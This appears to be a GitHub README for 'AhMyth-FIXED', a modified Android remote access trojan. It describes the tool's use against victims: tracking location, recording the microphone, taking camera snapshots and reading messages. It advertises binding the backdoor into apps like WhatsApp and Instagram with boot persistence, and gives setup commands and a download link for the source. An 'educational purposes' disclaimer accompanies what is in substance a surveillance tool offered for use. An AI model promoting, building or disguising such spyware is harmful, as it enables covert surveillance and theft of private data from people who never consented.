<p align="center">
  
  <img width="350" src="https://user-images.githubusercontent.com/64344168/135561002-a0f148ce-c841-4bf5-9cdb-a205297dd312.jpg">

</p>

# Ahmyth-FIXED
AhMyth is a powerful open-source remote administration tool FIXED by AuxGrep ( support all android versions).

# AbOUT 
AhMyth is a powerful open-source remote administration tool that can be used to access informational data from an android device. Through it, an attacker can access critical information such as the current geographical location of the device being attacked. In advanced use cases it can be used to hack the victim’s microphone and launch recordings, get camera snapshots and also read personal messages on the attacked device.

#
This tool is designed with a GUI interface and this makes one of the easiest RATs to use. With this tool, you can easily log in and gain direct control to an android device as an administrator.

#
    AhMyth is designed solely for educational purposes. I am not in any way reponsible for any damage or 
    harm to any devices, you use this at your own risk, I also DO NOT OWN THIS PROJECT, I have just 
    contributed to it, this Android RAT application belongs to its creator AhMyth
    
# FIXES 
AhMyth As a remote administration tool, AhMyth has two parts which enable it to effectively perform its functions. It has a server-side which acts like a desktop application that is built on an electron framework. The server side is used by the attacker as the control panel through which connections are made to the AhMyth software that is installed on the victim’s Android device. The client-side of AhMyth works as the android application and can be used as a backdoor.

This rat is facing huge bugs and the original one doesnt support new android versions (10,11,12,13 and up) therefore i take a time and fix those bugs.
am not good in android apps development Therefore i decide to use my python programming,nodejs and java concepts to atleast to make it happens and GUES WHAT!?? now IT SUPPORT ALL ANDROID VERSIONs.
with this version of rat > you can bind it with any apk of your choice in both methods ( launcher activity and onboot binding) it works with different apps such as whatsapp,instagram and much more.

# CHALLANGES 
this version of fixes worked fine but still it got some challanges and i still working on it to find solutions .
  1. flickering Victim's Connections with `socket.io-client`, currently needs to maintain `socket.io-client` to hold a connection without flickering back and forth with Connecting and Disconnecting with Victims
  2. Challange on successfully integrate AngeCryption into AhMyth for steganography builder
  
 # INSTALLATION | MANUALY
 
 TO build this rat , your linux sys needs to have some packages installed
 #
     sudo apt-get update upgrade
 #
     sudo apt-get install npm nodejs
     
     apt-get install aapt android-framework-res -y
     
 You need java jdk 8 `jdk-8u351-linux-x64.tar.gz` it depend with your version. Download it and configure it ....just follow me 
 
 visit and download it from here `https://www.oracle.com/java/technologies/downloads/` register free account and download
 After successfull downloaded, Run the following command to install it
#
    sudo tar -xf jdk-8u351-linux-x64.tar.gz -C /opt
    
    cd /opt
    
    cd jdk1.8.0_351/bin
    
    sudo update-alternatives --install "/usr/bin/java" "java" "/opt/jdk1.8.0_351/bin/java" 1
    
    sudo update-alternatives --config java
    
 choose java 8 from the list and u can check if it is installed by this command `java --version`
  
 Download source codes here https://www.mediafire.com/file/jih34e82swufxfj/AhMyth-FIXED_AuxGrep.tar.gz/file
     
 inside of Ahmyth-Server run the following commands
 #   
     npm install -g electron@9.4.1
     
     npm install
     
     npm audit fix --force
     
 DOne?????
 
 Starting it by this command `npm start`
 
 # WATCH
 https://www.youtube.com/watch?v=zdlILxhiYic
    
